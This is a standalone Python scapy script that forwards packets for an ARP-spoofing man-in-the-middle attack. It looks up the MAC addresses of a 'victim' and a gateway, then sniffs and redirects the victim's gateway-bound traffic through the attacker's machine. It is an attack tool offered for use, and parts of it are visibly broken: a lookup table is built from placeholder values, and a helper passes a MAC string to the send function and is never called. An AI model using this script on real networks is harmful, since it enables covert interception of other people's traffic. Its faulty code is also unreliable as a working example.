import scapy.all as scapy
import time

from scapy.layers.inet import IP
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, sniff

MY_MAC = Ether().src


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc


target_mac_address = "na"
gateway_mac_address = "na"
_SRC_DST = {
    gateway_mac_address: target_mac_address,
    target_mac_address: gateway_mac_address,
}


def get_ips():
    target_ip = input("Enter the Target's IP Address: ")
    gateway_ip = input("Enter the Gateway/Spoofed IP Address: ")
    return [target_ip, gateway_ip]


def forward_pkt(pkt):
    pkt[Ether].dst = _SRC_DST.get(pkt[Ether].src, gateway_mac_address)
    sendp(pkt[Ether].dst)


target_ip, gateway_ip = get_ips()

target_mac_address = "N/A"
gateway_mac_address = "N/A"
retry_counter = 0
while 1:
    try:
        if (retry_counter == 5):
            print("Timed out.")
            break
        target_mac_address = get_mac(target_ip)
    except IndexError:
        print("Failed to get MAC Address, retrying...")
        retry_counter = retry_counter + 1
        continue
    break
retry_counter = 0
while 1:
    try:
        if (retry_counter == 5):
            print("Timed out.")
            break
        gateway_mac_address = get_mac(gateway_ip)
    except IndexError:
        print("Failed to get MAC Address, retrying...")
        retry_counter = retry_counter + 1
        continue
    break

print("forwarding now!")

print("Gateway's MAC address is ", gateway_mac_address)
print("Victim's MAC address is ", target_mac_address)


def handle_packet(packet):
    if (packet[IP].dst == gateway_ip) and (packet[Ether].dst == MY_MAC):
        packet[Ether].dst = gateway_mac_address

        sendp(packet)

        print("A packet from " + packet[IP].src + " redirected!")



sniff(prn=handle_packet, filter="ip", store=0)
